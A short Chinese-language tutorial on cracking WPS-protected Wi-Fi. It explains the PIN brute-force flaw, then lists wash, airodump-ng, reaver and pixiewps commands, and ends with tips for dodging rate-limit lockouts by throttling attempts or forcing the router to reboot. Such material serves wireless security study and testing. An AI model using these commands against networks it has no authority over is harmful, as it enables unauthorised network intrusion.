# WPS破解

## 0x01 简介
> WPS (WIRELESS PROTECTED SETUP),是WiFi联盟2006年开放的一项技术

- 通过PIN码来简化无线接入的操作，无需记住PSK
- 路由器和网卡各按一个按钮就能接入无线
- PIN码是分为前后各4位的2段共8位数字


## 0x02 安全漏洞
- 2011年被发现安全涉及漏洞 
- 接入发起方可以根据路由器的返回信息判断前4位是否正确
- 而PIN码的后4位只有1000中定义的组合(最后一位是checksum)
- 所以全部穷举破解只需要11000次尝试
  - PSK: 218,340,105,584,896 
- 标准本身没有设计锁定机制，目前多个厂商已实现锁定机制

### 设置隐患
- 包括Linksys在内的很多厂家的无线路由器无法关闭WPS功能, 即使部分在WEB节目中有关闭WPS，配置也不一定会生效
- 攻击难度相对较低，防御却十分困难  
- 理论上一般可在4-10小时爆破密码(实际并不乐观)
- 部分厂商的路由可以用计算器直接算出PIN
  > 特征:` C83A35, 00B00C `, 前6位转十六进制,然后看情况前面补零, 部分路由有这些特征, pin码也不对.


## 0x03 破解
- 启动侦听模式后，发现支持WPS的AP  

```
wash -i wlan0mon
或
airodump-ng -i wlan0mon --wps
```
- 爆破PIN码

```
reaver -i wlan0mon -b <AP mac> -vv -c 11 

尝试秒破PIN码
reaver -i wlan0mon -b <AP mac> -vv -K 1  # 利用pixiewps去利用特定厂商的芯片漏洞,成功率很低
# pixiewps -e <pke> -r <pkr> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce>

如果已经知道pin
reaver -i wlan0mon -b <AP mac> -vv -p 88888888
```

### 注意点
- 很多厂家实现了锁定机制，所以爆破时应注意限速
- 一旦触发锁定，可尝试耗尽AP连接数，令其重启并解除WPS锁定
